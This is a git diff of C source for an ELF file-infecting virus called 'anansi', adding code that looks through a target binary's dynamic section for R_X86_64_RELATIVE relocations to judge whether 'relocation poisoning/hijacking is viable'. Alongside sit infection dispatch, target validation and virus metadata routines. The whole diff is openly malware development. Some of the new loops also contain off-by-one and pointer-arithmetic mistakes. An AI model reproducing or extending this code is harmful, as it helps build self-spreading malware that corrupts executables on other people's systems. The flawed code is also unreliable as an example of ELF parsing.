@@ -64,6 +64,8 @@ extern unsigned long real_start;
 
 // functions unique to anansi
 int dispatch_infection(Elfbin *target);
+bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *r);
+unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size);
 void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size);
 char *create_full_path(char *directory, char *filename);
 void process_elf_initialize(Elfbin *c, char *full_path);
@@ -74,7 +76,7 @@ bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);
 #ifdef DEBUG
 	int anansi_printf(char *format, ...);
 	char *itoa(void *data_num, int base, int var_type);
-	char *itoa_final(long n, int base);
+	char *itoa_final(unsigned long n, int base);
 #endif
 
 /* vx-mechanics functions and global vars*/
@@ -233,36 +235,100 @@ clean_up:
 
 int dispatch_infection(Elfbin *target)
 {
+	Elf64_Rela r;
 #ifdef DEBUG
 	anansi_printf("Viable target: %s\n", target->f_path);
 #endif
+	has_R_X86_64_RELATIVE(target, &r);
 
 	return 0;
 }
+
+/*
+ * Checks to see if relocation poisoning/hijacking is viable, we are targeting R_X86_64_RELATIVE relocation type.
+ * libc and ld-linux shared objects should not contain this type.
+ */
+
+bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *s)
+{
+	int p_entry;
+
+	Elf64_Xword dyn_size;
+	int dyn_entry_cnt;
+
+	int dynamic_phdr;
+	bool found_dynamic = false;
+
+	Elf64_Rela *reloc_entry;
+	Elf64_Dyn *dyn_start;
+	Elf64_Dyn *dyn_entries;
+
+	Elf64_Addr rela_offset = 0;
+	Elf64_Xword rela_sz, rela_ent_size;
+
+	Elf64_Rela *relocations;
+
+	Elf64_Word rela_size = 0, rela_count = 0;
+	for(p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++) {
+		if(target->phdr[p_entry].p_type == PT_DYNAMIC) {
+			found_dynamic = true;
+			break;
+		}
+	}
+
+	if(!found_dynamic)
+		return false;
+	dynamic_phdr = p_entry;
+
+	dyn_start = (Elf64_Dyn *)(target->read_only_mem + target->phdr[dynamic_phdr].p_offset);
+	dyn_size = target->phdr[dynamic_phdr].p_filesz;
+	dyn_entry_cnt = dynamic_entry_count(dyn_start, dyn_size);
+
+	dyn_entries = dyn_start;
+	for(int i = 0; i <= dyn_entry_cnt; i++) {
+		if(dyn_entries[i].d_tag == DT_RELA)
+			rela_offset = dyn_entries[i].d_un.d_val;
+
+		if(dyn_entries[i].d_tag == DT_RELASZ)
+			rela_sz = dyn_entries[i].d_un.d_val;
+
+		if(dyn_entries[i].d_tag == DT_RELAENT)
+			rela_ent_size = dyn_entries[i].d_un.d_val;
+	}
+
+	rela_count = rela_sz / rela_ent_size;
+	reloc_entry = (Elf64_Rela*)(target->read_only_mem + rela_offset);
+	for(int r = 0; r <= rela_count; r++) {
+		if(reloc_entry[r].r_info == R_X86_64_RELATIVE) {
+#ifdef DEBUG
+			anansi_printf("R_X86_64_RELATIVE offset @ %lx\n", reloc_entry[r].r_offset);
+			anansi_printf("R_X86_64_RELATIVE addend @ %lx\n", reloc_entry[r].r_addend);
+#endif
+		}
+	}
+
+}
+
+
+unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size)
+{
+	Elf64_Dyn *cur_dyn_entry;
+	void *dyn_end = dyn_start + dyn_size;
+	int cnt = 1; //DT_NULL
+
+	for(cur_dyn_entry = dyn_start; (uint8_t *)cur_dyn_entry <= (uint8_t *)dyn_end; cur_dyn_entry++, cnt++)
+		if(cur_dyn_entry->d_tag == DT_NULL)
+			break;
+
+	return cnt;
+}
+
 
 void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size)
 {
 	target->vx_start = vx_start;
 	target->vx_size = vx_size;
 }
-
-/* c - Elfbin type struct where process_elf will write to.
- * attr - Which portions of the elf file to load (elf header, program header, section header)
- * perm - accept PROCESS_ELF_O_RDONLY, PROCESS_ELF_O_WRONLY, PROCESS_ELF_O_ATTRONLY
- *        + PROCESS_ELF_O_RDONLY will produce a reference (c->read_only_mem) to the entire file mapping
- *        where underlying attributes (ehdr,shdr and phdr for example) will ba based on.
- *
- *        + PROCESS_ELF_O_RDWR will produce two mappings one of which is the same as PROCESS_ELF_O_RDONLY
- *        and the other the length of the binary plus 'len' parameter. The contents of read_only_mem is copied over
- *        into that write_only_mem mapping.
- *
- *        + PROCESS_ELF_O_ATTRONLY will retrieve the attributes specified. Attributes are
- *        indepently allocated (not a reference to read_only_mem).
- *
- * len - additional space allocated for adding bytes to to the binary (stat.st_size + len)
- * p - path to the targetted binary.
- */
-
 
 int process_elf(Elfbin *target, int attr, int perm, int len)
 {
@@ -296,7 +362,6 @@ int process_elf(Elfbin *target, int attr, int perm, int len)
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)(mem + (((Elf64_Ehdr *)mem)->e_phoff));
 	shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);
-
 
 	if(perm & PROCESS_ELF_O_RDONLY || perm & PROCESS_ELF_O_RDWR) {
 		target->read_only_mem = mem;
@@ -580,7 +645,7 @@ char *itoa(void *data_num, int base, int var_type) {
 		return itoa_final(*(long *)data_num, base);
 }
 
-char *itoa_final(long n, int base)
+char *itoa_final(unsigned long n, int base)
 {
 	char *conv = "0123456789abcdef";
 
